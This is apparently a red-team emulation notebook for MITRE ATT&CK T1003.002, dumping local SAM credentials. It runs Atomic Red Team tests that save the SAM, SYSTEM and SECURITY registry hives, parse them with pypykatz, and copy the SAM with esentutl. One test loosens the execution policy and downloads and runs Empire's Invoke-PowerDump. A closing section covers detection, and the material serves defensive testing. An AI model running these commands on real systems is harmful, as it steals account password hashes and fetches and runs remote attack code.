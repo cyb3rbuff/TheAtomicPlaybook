{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# T1003.002 - OS Credential Dumping: Security Account Manager\n",
    "Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user</code> command. Enumerating the SAM database requires SYSTEM level access.\n",
    "\n",
    "A number of tools can be used to retrieve the SAM file through in-memory techniques:\n",
    "\n",
    "* pwdumpx.exe\n",
    "* [gsecdump](https://attack.mitre.org/software/S0008)\n",
    "* [Mimikatz](https://attack.mitre.org/software/S0002)\n",
    "* secretsdump.py\n",
    "\n",
    "Alternatively, the SAM can be extracted from the Registry with Reg:\n",
    "\n",
    "* <code>reg save HKLM\\sam sam</code>\n",
    "* <code>reg save HKLM\\system system</code>\n",
    "\n",
    "Creddump7 can then be used to process the SAM database locally to retrieve hashes.(Citation: GitHub Creddump7)\n",
    "\n",
    "Notes: \n",
    "* RID 500 account is the local, built-in administrator.\n",
    "* RID 501 is the guest account.\n",
    "* User accounts start with a RID of 1,000+.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Atomic Tests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#Import the Module before running the tests.\n",
    "Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Registry dump of SAM, creds, and secrets\n",
    "Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated\n",
    "via three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7\n",
    "\n",
    "Upon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.\n",
    "\n",
    "**Supported Platforms:** windows\n",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n",
    "reg save HKLM\\sam %temp%\\sam\n",
    "reg save HKLM\\system %temp%\\system\n",
    "reg save HKLM\\security %temp%\\security\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1003.002 -TestNumbers 1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Registry parse with pypykatz\n",
    "Parses registry hives to obtain stored credentials\n",
    "\n",
    "**Supported Platforms:** windows\n",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n",
    "pypykatz live registry\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1003.002 -TestNumbers 2"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - esentutl.exe SAM copy\n",
    "Copy the SAM hive using the esentutl.exe utility\n",
    "This can also be used to copy other files and hives like SYSTEM, NTUSER.dat etc.\n",
    "\n",
    "**Supported Platforms:** windows\n",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n",
    "del #{copy_dest}\\#{file_name} & esentutl.exe /y /vss #{file_path} /d #{copy_dest}/#{file_name}\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1003.002 -TestNumbers 3"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - PowerDump Registry dump of SAM for hashes and usernames\n",
    "Executes a hashdump by reading the hasshes from the registry.\n",
    "**Supported Platforms:** windows\n",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n",
    "Write-Host \"STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\" -fore green\n",
    "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore\n",
    "Invoke-Webrequest -Uri \"https://github.com/BC-SECURITY/Empire/blob/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1\" -UseBasicParsing -OutFile \"$Env:Temp\\PowerDump.ps1\"\n",
    "Import-Module .\\PowerDump.ps1\n",
    "Invoke-PowerDump```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1003.002 -TestNumbers 4"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Detection\n",
    "Hash dumpers open the Security Accounts Manager (SAM) on the local file system (<code>%SystemRoot%/system32/config/SAM</code>) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [Valid Accounts](https://attack.mitre.org/techniques/T1078) in-use by adversaries may help as well."
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}